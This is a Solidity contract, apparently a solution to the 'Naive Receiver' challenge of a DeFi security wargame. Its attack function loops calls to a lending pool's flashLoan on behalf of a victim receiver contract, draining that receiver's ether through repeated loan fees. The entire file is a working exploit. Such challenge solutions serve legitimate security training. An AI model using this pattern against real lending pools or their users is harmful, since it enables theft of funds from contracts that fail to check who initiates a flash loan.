// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiverExploiter {
    NaiveReceiverLenderPool public pool;
    address public attacker;

    constructor(address payable poolAddress) public {
        pool = NaiveReceiverLenderPool(poolAddress);
        attacker = msg.sender;
    }

    function attack(address payable receiver, uint256 times) external {
        require(msg.sender == attacker, "Only attacker can execute flash loan");

        for (uint256 i = 0; i < times; i++) {
            pool.flashLoan(receiver, 1 ether);
        }
    }
}